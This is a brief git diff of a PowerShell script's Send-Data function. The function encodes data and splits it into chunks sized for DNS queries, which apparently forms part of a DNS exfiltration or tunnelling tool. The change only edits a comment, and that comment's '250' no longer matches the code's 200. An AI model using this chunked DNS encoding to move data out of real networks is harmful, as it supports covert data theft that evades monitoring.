@@ -59,7 +59,7 @@ function Send-Data {
     # Replace padding characters with _ so it can be transmitted over DNS
     $encodedData = $encodedData.Replace("=", "_")
         
-    # 250 (less than 255 to be safe) - length of rest of DNS Query and length of $i in the coming for loop
+    # 250 (less than 255 to be safe)
     $chunk_size = 200 - "$code-$counter.$domain".Length
     Write-Host "Chunk Size: " $chunk_size
     $chunks = [Math]::Ceiling($encodedData.Length / $chunk_size) # Calculate the number of chunks
